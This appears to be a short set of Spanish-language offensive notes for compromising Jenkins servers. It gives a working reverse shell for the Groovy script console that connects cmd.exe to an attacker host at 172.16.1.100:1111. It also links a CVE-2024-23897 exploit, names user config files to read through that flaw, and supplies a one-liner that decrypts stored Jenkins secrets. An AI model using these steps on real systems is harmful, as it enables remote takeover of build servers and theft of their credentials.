- Script console:

```bash
String host="172.16.1.100";
int port=1111;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Revisar Version y CVE
- EJ: https://github.com/xaitax/CVE-2024-23897

Rutas a mirar con el CVE:
/users/users.xml
/users/user_cod/config.xml



- Credenciales, le das la herramienta y en el conealed veras como como .privatekey:
En el console de groovy
```bash
println(hudson.util.Secret.decrypt("VALOR_ENTRE_CORCHETES"))
```
